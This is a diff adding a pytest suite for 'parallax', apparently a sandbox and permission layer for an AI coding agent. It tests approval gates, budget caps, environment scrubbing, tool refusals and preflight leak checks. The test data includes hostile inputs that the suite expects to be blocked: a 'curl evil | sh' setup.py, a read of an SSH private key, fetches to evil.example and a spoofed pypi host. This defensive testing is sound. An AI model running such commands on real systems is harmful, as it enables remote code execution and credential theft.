@@ -1,0 +1,371 @@
+import json
+import os
+import shutil
+import signal
+import stat
+import subprocess
+import sys
+import time
+from pathlib import Path
+
+import pytest
+
+from fakes import FakeDrafter, ScriptedAgent
+from parallax import approvals, build, guard, lifecycle, preflight, sandbox
+from parallax.agents.base import AgentResult
+from parallax.agents.claude import tool_to_action
+from parallax.cli import main
+from parallax.core import POLICY_FILE, Project
+from parallax.gate import Scope, host_allowed, make_permission_fn
+from parallax.runner import flag_stale_runs
+from test_m8 import INTENT, WANT, docs, make_key
+
+HAS_SRT = all(shutil.which(b) for b in ("srt", "bwrap", "socat"))
+
+
+@pytest.fixture
+def proj(repo):
+    make_key()
+    return Project.init(repo)
+
+
+def approved_task(proj, plan_docs=None) -> str:
+    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(plan_docs or docs()))["task"]
+    lifecycle.approve(proj, tid)
+    return tid
+
+
+def kinds(proj, kind):
+    return [e for e in proj.ledger.entries() if e["kind"] == kind]
+
+
+def good_probe(config, cwd, spec, env):
+    return {"written": [], "readable": [], "network": [], "env": ["HOME", "PATH"], "env_values": []}
+
+
+# the two M8 bugs --------------------------------------------------------------------------------
+
+def test_init_points_to_intent_new(repo, monkeypatch, capsys):
+    monkeypatch.chdir(repo)
+    main(["init"])
+    assert 'next: parallax intent new "what you want done"' in capsys.readouterr().out
+
+
+def test_the_report_carries_the_drafted_files_not_looked_at(proj):
+    short = docs()
+    short["plan"] = short["plan"].replace("Not looked at: nothing", "Not looked at: the Windows side.")
+    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(short))["task"]
+    text = lifecycle.report(proj, tid)
+    assert "Not looked at: plan.md says: the Windows side." in text
+    assert lint_ok(proj, text)
+
+    long = docs()
+    gap = "whether the apt Node is new enough, whether the NodeSource script moved, and a fresh distro run"
+    long["intent"] = long["intent"].replace("Not looked at: nothing", f"Not looked at: {gap}.")
+    long["plan"] = long["plan"].replace("Not looked at: nothing", "Not looked at: anything under docs/tasks/.")
+    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(long))["task"]
+    text = lifecycle.report(proj, tid)
+    assert "Not looked at: what the drafters list under Found (2)" in text
+    assert f"- docs/tasks/{tid}/intent.md:2 not looked at: {gap}." in text
+    assert f"- docs/tasks/{tid}/plan.md:2 not looked at: anything under docs/tasks/." in text
+    assert lint_ok(proj, text)
+
+
+def test_very_long_gaps_move_to_details_and_still_lint(proj):
+    long = docs()
+    gap = " ".join(["unchecked"] * 160)
+    long["plan"] = long["plan"].replace("Not looked at: nothing", f"Not looked at: {gap}.")
+    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(long))["task"]
+    text = lifecycle.report(proj, tid)
+    assert "under Details (1)" in text and "\nDetails\n" in text and gap in text
+    assert lint_ok(proj, text)
+
+
+def lint_ok(proj, text):
+    from parallax import lint
+    return lint.lint_report(text, root=proj.root, ledger_ids={e["id"] for e in proj.ledger.entries()}) == []
+
+
+# the generated sandbox ---------------------------------------------------------------------------
+
+def test_the_rules_come_from_the_plan_and_live_outside_the_worktree(proj):
+    plan = docs()["plan"].replace("domains = []", 'domains = ["pypi.org"]').replace(
+        "outside_reads = []", 'outside_reads = ["/opt/data"]')
+    tid = approved_task(proj, {**docs(), "plan": plan})
+    p = build.prepare(proj, tid)
+    wt = p.worktree
+    git_dir = sandbox.shared_git_dir(wt)
+    assert git_dir == (proj.root / ".git").resolve()
+
+    s = json.loads(p.settings.read_text())["sandbox"]
+    assert (s["enabled"], s["failIfUnavailable"], s["allowUnsandboxedCommands"], s["autoAllowBashIfSandboxed"]) \
+        == (True, True, False, False)
+    assert s["network"] == {"allowedDomains": ["pypi.org"], "strictAllowlist": True, "allowLocalBinding": False}
+    fs = s["filesystem"]
+    assert fs["allowWrite"] == [str(wt)]
+    assert {str(wt / t) for t in sandbox.ROOT_TARGETS} | {str(git_dir)} <= set(fs["denyWrite"])
+    assert fs["denyRead"][:2] == [str(Path.home()), "/mnt"] and str(approvals.key_path().parent) in fs["denyRead"]
+    assert fs["allowRead"] == [str(wt), str(git_dir), "/opt/data"]
+    assert json.loads((p.home / "srt.json").read_text())["filesystem"] == fs
+
+    assert not p.settings.is_relative_to(wt) and not p.settings.is_relative_to(proj.root)
+    assert stat.S_IMODE(p.home.stat().st_mode) == 0o700
+    assert p.scope == Scope(reads=(Path("/opt/data"),), domains=("pypi.org",))
+
+
+def test_nested_protected_paths_are_denied_and_runtime_mount_points_exist(proj):
+    tid = approved_task(proj)
+    wt = Path(proj.task(tid)["worktree"])
+    (wt / "sub").mkdir()
+    (wt / "sub" / "CLAUDE.md").write_text("x")
+    (wt / ".claude").mkdir()
+    targets = sandbox.protected_targets(wt)
+    assert wt / "sub" / "CLAUDE.md" in targets and wt / ".claude" in targets
+    build.prepare(proj, tid)
+    assert (wt / ".claude" / "commands").is_dir() and (wt / ".claude" / "agents").is_dir()
+    assert "commands" not in subprocess.run(["git", "-C", str(wt), "status", "--porcelain"],
+                                            capture_output=True, text=True).stdout
+
+
+def test_leftover_placeholders_are_removed_but_real_work_stays(proj):
+    tid = approved_task(proj)
+    wt = Path(proj.task(tid)["worktree"])
+    (wt / "package.json").write_text('{"name": "mine"}')  # real content: kept
+    before = sandbox.untracked(wt)
+    for name in (".env", "yarn.lock", "notes.txt"):
+        (wt / name).touch()
+    assert sandbox.remove_leftovers(wt, before) == [".env", "yarn.lock"]
+    assert (wt / "notes.txt").exists() and (wt / "package.json").exists()
+
+
+# before launch ----------------------------------------------------------------------------------
+
+def test_build_needs_an_approved_unchanged_plan(proj):
+    tid = lifecycle.new_intent(proj, WANT, FakeDrafter(docs()))["task"]
+    with pytest.raises(Exception, match="isn't approved yet"):
+        build.prepare(proj, tid)
+    lifecycle.approve(proj, tid)
+    plan = lifecycle.doc_path(proj, tid, "plan")
+    plan.write_text(plan.read_text() + "\n")
+    with pytest.raises(Exception, match="changed after you approved it"):
+        build.prepare(proj, tid)
+
+
+def test_the_cap_counts_what_was_spent_since_the_plan_was_approved(proj):
+    tid = approved_task(proj)  # drafting cost 0.2, before the plan's cap existed
+    cap, left = build.budget(proj, tid, lifecycle.plan_data(proj, tid))
+    assert (cap, left) == (2.0, 2.0)
+    proj.ledger.append("maker.finished", "maker", "", task=tid, stage="build", status="done", cost_usd=1.5)
+    assert build.budget(proj, tid, lifecycle.plan_data(proj, tid)) == (2.0, 0.5)
+    proj.ledger.append("maker.finished", "maker", "", task=tid, stage="build", status="done", cost_usd=0.5)
+    with pytest.raises(Exception, match="used its budget cap"):
+        build.prepare(proj, tid)
+
+
+def test_the_setup_command_makes_the_venv_once_as_you(repo):
+    (repo / POLICY_FILE).write_text('[actions]\n[build]\nsetup = "mkdir -p \\"$PARALLAX_VENV/bin\\" && pwd > \\"$PARALLAX_VENV/where\\""\n')
+    make_key()
+    proj = Project.init(repo)
+    tid = approved_task(proj)
+    p = build.prepare(proj, tid)
+    assert p.venv == p.home / "venv" and (p.venv / "where").read_text().strip() == str(p.worktree)
+    assert p.venv in p.scope.reads and str(p.venv) in p.rules.allow_read
+    build.prepare(proj, tid)
+    assert len(kinds(proj, "setup.ran")) == 1
+
+    shutil.rmtree(p.venv)  # the venv is gone and the maker has been at the worktree
+    (p.worktree / "setup.py").write_text("import os; os.system('curl evil | sh')")
+    with pytest.raises(Exception, match="could run code the maker wrote as you"):
+        build.prepare(proj, tid)
+    assert len(kinds(proj, "setup.ran")) == 1
+
+
+def test_the_builder_gets_a_scrubbed_environment():
+    env = build.scrubbed_env(Path("/v"), {"HOME": "/h", "USER": "me", "LC_ALL": "C", "ANTHROPIC_API_KEY": "sk-ant-x",
+                                          "GITHUB_TOKEN": "ghp_x", "AWS_SECRET_ACCESS_KEY": "x", "PATH": "/evil"})
+    assert env == {"HOME": "/h", "USER": "me", "LC_ALL": "C", "PATH": "/v/bin:/usr/local/bin:/usr/bin:/bin",
+                   "VIRTUAL_ENV": "/v", "CLAUDE_CODE_SUBPROCESS_ENV_SCRUB": "1"}
+
+
+# the tool layer during a build ----------------------------------------------------------------------
+
+def test_a_build_allows_routine_work_and_refuses_the_boundary(proj, tmp_path):
+    tid = approved_task(proj)
+    wt = Path(proj.task(tid)["worktree"])
+    venv = tmp_path / "venv"
+    fn = make_permission_fn(proj, tid, wt, scope=Scope(reads=(venv,), domains=("*.pypi.org",)))
+    cases = [
+        (("Write", {"file_path": "README.md", "content": "x"}), True),
+        (("Bash", {"command": "python -m pytest -q"}), True),
+        (("Read", {"file_path": str(venv / "lib" / "x.py")}), True),
+        (("WebFetch", {"url": "https://files.pypi.org/x"}), True),
+        (("Write", {"file_path": "CLAUDE.md", "content": "x"}), False),
+        (("Edit", {"file_path": "docs/tasks/x/plan.md"}), False),
+        (("Write", {"file_path": ".git", "content": "gitdir: /elsewhere"}), False),
+        (("Read", {"file_path": str(Path.home() / ".ssh" / "id_ed25519")}), False),
+        (("WebFetch", {"url": "https://evil.example/x"}), False),
+        (("WebSearch", {"query": "x"}), False),
+        (("Task", {"prompt": "spawn"}), False),
+    ]
+    for (tool, args), ok in cases:
+        assert fn(*tool_to_action(tool, args)).allowed is ok, (tool, args)
+    assert kinds(proj, "decision.requested") == []  # nothing waits on you
+
+
+def test_ask_means_refuse_and_record_without_an_inbox_item(proj):
+    t = proj.new_task("x")
+    fn = make_permission_fn(proj, t["task"], Path(t["worktree"]))  # the policy: fs.write = ask
+    p = fn("fs.write", "a.txt", ["a.txt"])
+    assert not p.allowed and "refused and recorded" in p.message
+    [e] = [e for e in kinds(proj, "action.refused") if e["data"].get("asked")]
+    assert proj.inbox() == []
+
+
+def test_host_matching():
+    assert host_allowed("https://pypi.org/simple", ("pypi.org",))
+    assert host_allowed("https://files.pypi.org/x", ("*.pypi.org",))
+    assert not host_allowed("https://pypi.org.evil.com/", ("pypi.org",))
+    assert not host_allowed("https://x.org/", ())
+
+
+def test_shell_check_reads_tokens_not_substrings(tmp_path):
+    assert guard.check_shell("cat .gitignore && git status", tmp_path) is None
+    assert guard.check_shell("echo x > CLAUDE.md", tmp_path)
+    assert guard.check_shell("dd if=a of=.claude/settings.json", tmp_path)
+    assert guard.check_shell(f"touch {tmp_path}/docs/tasks/x", tmp_path)
+
+
+# preflight -------------------------------------------------------------------------------------------
+
+def test_preflight_passes_when_nothing_gets_through(proj):
+    tid = approved_task(proj)
+    p = build.prepare(proj, tid)
+    lines = build.run_preflight(proj, p, runner=good_probe)
+    assert all(l.ok for l in lines), lines
+    out = preflight.report(lines)
+    paths = len(sandbox.protected_targets(p.worktree)) + 1  # and the shared .git directory
+    assert out[0].startswith(f"bash layer   0 of {paths} protected paths writable") and out[-1] == "ready to launch."
+    assert out[1].startswith(f"tool layer   0 of {paths * 5 + 2} protected writes and reads allowed")
+    assert [e["kind"] for e in proj.ledger.entries()][-1] == "preflight.recorded"  # its only trace
+
+
+@pytest.mark.parametrize("probe,line", [
+    (lambda *a: None, "bash layer"),
+    (lambda c, cwd, spec, env: {**good_probe(c, cwd, spec, env), "written": spec["sentinels"][:1]}, "bash layer"),
+    (lambda c, cwd, spec, env: {**good_probe(c, cwd, spec, env), "network": ["127.0.0.1:1"]}, "network"),
+    (lambda c, cwd, spec, env: {**good_probe(c, cwd, spec, env), "env": ["GITHUB_TOKEN"]}, "environment"),
+    (lambda c, cwd, spec, env: {**good_probe(c, cwd, spec, env), "readable": spec.get("reads", [])}, "environment"),
+])
+def test_preflight_refuses_anything_that_gets_through(proj, probe, line):
+    tid = approved_task(proj)
+    p = build.prepare(proj, tid)
+    lines = {l.name: l for l in build.run_preflight(proj, p, runner=probe)}
+    assert not lines[line].ok
+    assert preflight.report(list(lines.values()))[-1] == "not ready: refusing to launch."
+
+
+def test_a_sentinel_that_got_through_is_removed(proj):
+    tid = approved_task(proj)
+    p = build.prepare(proj, tid)
+
+    def leaky(config, cwd, spec, env):
+        for s in spec["sentinels"]:
+            Path(s).write_text("x")
+        return good_probe(config, cwd, spec, env)
+
+    lines = build.run_preflight(proj, p, runner=leaky)
+    assert not lines[0].ok and lines[0].detail.startswith("1 of ")
+    assert not list((proj.root / ".git").glob(".parallax-preflight-*"))
+
+
+@pytest.mark.skipif(not HAS_SRT, reason="needs srt, bubblewrap and socat")
+def test_preflight_against_the_real_sandbox(proj):
+    tid = approved_task(proj)
+    wt = Path(proj.task(tid)["worktree"])
+    (wt / ".claude").mkdir()
+    p = build.prepare(proj, tid)
+    lines = build.run_preflight(proj, p)
+    assert all(l.ok for l in lines), preflight.report(lines)
+    assert subprocess.run(["git", "-C", str(wt), "status", "--porcelain"], capture_output=True, text=True).stdout == ""
+    assert not list((proj.root / ".git").glob(".parallax-preflight-*"))
+
+    import dataclasses
+    weak = dataclasses.replace(p.rules, deny_write=[], allow_write=[str(wt), str(proj.root / ".git")])
+    real, _, leaked = preflight.bash_layer(wt, sandbox.protected_targets(wt), sandbox.shared_git_dir(wt), weak,
+                                           p.home, build.scrubbed_env(None), preflight.run_srt,
+                                           {"reads": [], "value_marks": []})
+    assert len(leaked) == 2 and not list((proj.root / ".git").glob(".parallax-preflight-*"))
+
+
+# launch, run, stop -------------------------------------------------------------------------------------
+
+def test_cli_build_runs_preflight_then_launches(proj, monkeypatch, capsys):
+    tid = approved_task(proj)
+    monkeypatch.chdir(proj.root)
+    monkeypatch.setattr(preflight, "run_srt", lambda *a: None)
+    assert main(["build", tid]) == 1
+    assert "not ready: refusing to launch." in capsys.readouterr().out
+    assert kinds(proj, "build.started") == []
+
+    spawned = []
+    monkeypatch.setattr(preflight, "run_srt", good_probe)
+    monkeypatch.setattr(build, "_spawn", lambda argv, env, cwd, log: spawned.append((argv, env)) or 4242)
+    assert main(["build", tid]) == 0
+    assert capsys.readouterr().out == f"building {tid}, estimated budget $2.00. parallax stop ends it.\n"
+    [(argv, env)] = spawned
+    assert argv[-3:] == ["parallax.build", str(proj.root), tid]
+    assert env["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"] == "1" and "ANTHROPIC_API_KEY" not in env
+    [s] = kinds(proj, "build.started")
+    assert s["data"]["pid"] == 4242 and proj.task(tid)["status"] == "running"
+    assert main(["build", tid]) == 1  # one build at a time
+    assert "already building" in capsys.readouterr().err
+
+
+def test_the_builder_runs_the_maker_and_records_the_outcome(proj):
+    tid = approved_task(proj)
+    got = {}
+
+    def maker_for(left, settings):
+        got.update(left=left, settings=settings)
+        return ScriptedAgent(steps=[("write", "README.md", "new\n"), ("call", lambda cwd: (cwd / ".env").touch())],
+                             summary="rewrote the README", cost=0.3)
+
+    assert build.run_build(proj, tid, maker_for) == "built"
+    assert got["left"] == 2.0 and got["settings"].endswith("settings.json")
+    assert kinds(proj, "sandbox.cleaned")[0]["data"]["files"] == [".env"]
+    assert lifecycle.status_line(proj, tid) == "built"
+    assert "README.md" in proj.diff(tid, "--name-only")
+
+
+@pytest.mark.parametrize("steps,summary,status", [
+    ([("call", lambda cwd: (cwd / "sub").mkdir() or (cwd / "sub" / "CLAUDE.md").write_text("x"))], "done", "disputed"),
+    ([], "blocked: needs network to pypi.org", "blocked"),
+])
+def test_the_builder_reports_what_went_wrong(proj, steps, summary, status):
+    tid = approved_task(proj)
+    agent = ScriptedAgent(steps=steps, summary=summary, status="gave_up" if summary.startswith("blocked") else "done")
+    assert build.run_build(proj, tid, lambda left, settings: agent) == status
+    [item] = proj.inbox()  # either way, it's waiting on you now
+    assert item["kind"] == ("disagreement.raised" if status == "disputed" else "stuck.raised")
+
+
+def test_stop_ends_every_running_build_and_records_it(proj, capsys, monkeypatch):
+    tid = approved_task(proj)
+    proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"], start_new_session=True)
+    proj.ledger.append("build.started", "parallax", "", task=tid, pid=proc.pid)
+    monkeypatch.chdir(proj.root)
+    assert main(["stop"]) == 0
+    assert capsys.readouterr().out == f"stopped {tid}.\n"
+    assert proc.wait(timeout=10) is not None
+    assert proj.task(tid)["status"] == "stopped"
+    main(["stop"])
+    assert capsys.readouterr().out == "nothing is running.\n"
+
+
+def test_a_builder_that_died_is_flagged_right_away(proj):
+    tid = approved_task(proj)
+    proc = subprocess.Popen([sys.executable, "-c", "pass"])
+    proc.wait()
+    proj.ledger.append("build.started", "parallax", "", task=tid, pid=proc.pid)
+    assert flag_stale_runs(proj) == [tid]
+    assert proj.task(tid)["status"] == "stuck"
